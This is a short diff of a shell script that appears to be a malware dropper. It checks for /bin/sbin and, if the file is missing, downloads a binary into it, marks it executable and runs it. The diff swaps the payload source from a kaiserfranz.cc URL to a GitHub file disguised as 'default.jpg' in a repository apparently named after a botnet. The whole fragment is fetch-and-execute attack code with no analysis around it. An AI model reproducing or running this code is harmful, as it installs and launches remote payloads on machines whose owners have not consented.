@@ -49,7 +49,7 @@ if [ -f "/bin/sbin" ]; then
 echo 'FOUND: sbin'
 else
 echo 'MISSING: sbin'
-loadthisfile http://kaiserfranz.cc/sbin /bin/sbin
+loadthisfile https://github.com/nandakrr/TNTbotinger/blob/main/default.jpg /bin/sbin
 chmod +x /bin/sbin
 /bin/sbin
 if [ ! -f "/bin/sbin" ]; then
